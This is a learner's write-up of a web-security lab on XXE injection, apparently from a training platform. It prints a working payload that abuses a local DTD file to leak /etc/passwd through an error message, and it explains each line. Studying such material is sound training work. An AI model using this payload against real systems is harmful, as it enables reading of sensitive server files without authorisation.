# Lab: Exploiting XXE to retrieve data by repurposing a local DTD

>This lab has a "Check stock" feature that parses XML input but does not display the result.

>To solve the lab, trigger an error message containing the contents of the /etc/passwd file.

>You'll need to reference an existing DTD file on the server and redefine an entity from it.


### Observations
We can see the vulnerable xml at `POST /product/stock`

This lab really puzzled me, so I looked at the solution and will try to break down why the solution works. Here is solution payload, which is to be inserted between the xml definition and the `<stockCheck>` attribute

```
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
```

### Breaking it down line by line
`<!DOCTYPE message [` -- DTD for item called message

`<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">` -- Getting reference to local DTD and storing it in var `local_dtd`

`<!ENTITY % ISOamso '` -- Starting definition for entity called `ISOamso` (Notice that the `'` is not closed, so the below 2 entities are nested inside this `ISOamso` entity)

`<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">` -- Nested entity under `ISOamso`, creates entity called `file` that points to /etc/passwd

`<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">` -- Creates entity called `eval` which will attempt to read a file that does not exist

`&#x25;eval;` -- calls the `eval` entity

`&#x25;error;` -- calls the `error` entity, which is nested inside `eval`

`'>` -- closing of the `ISOamso` entity definition. 

`%local_dtd;` -- Now that we have defined what our xml does, let's actually execute it

`]>` -- Close the DTD

### Explanation
In short, we accessed the existing DTD and overwrote the value of `ISOamso`. The error message then spits out the contents of `/etc/passwd`